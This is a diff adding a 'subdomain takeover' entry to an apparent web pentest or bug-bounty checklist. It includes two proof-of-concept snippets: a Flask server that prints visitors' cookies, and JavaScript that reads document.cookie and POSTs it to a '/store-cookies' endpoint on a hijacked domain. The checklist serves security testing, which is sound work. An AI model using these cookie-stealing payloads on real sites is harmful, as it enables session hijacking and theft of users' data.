@@ -86,3 +86,32 @@
     - [ ] check if the password change endpoint is vulnerable to IDOR
 
     - [ ] check if the password reset endpoint vulnerable to IDOR
+
+- subdomain takeover:
+    - [ ] first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal users info or cookies
+    - PoC Example
+        ```python
+        #!/usr/bin/python3
+        from flask import *
+
+        app = Flask(__name__)
+
+        @app.route('/')
+        def cookie_sniffer():
+            for c_name, c_value in request.cookies.items():
+                print(c_name + ': ' + c_value)
+            return 'Hello, world'
+        if __name__ == '__main__':
+            app.run(port=80)
+        ```
+    - [ ] second-order (broken link hijacking): if you found a broken link in a webpage (https://nonexistentlink.com/app.js) and you can takeover this domain you can host any malicious javascript file and use it to steal users info or cookies
+    - PoC Example
+        ```javascript
+        user_cookies = {
+            "cookies": document.cookie
+        }
+
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("POST", "/store-cookies", true);
+        xhttp.send(JSON.stringify(user_cookies));
+        ```
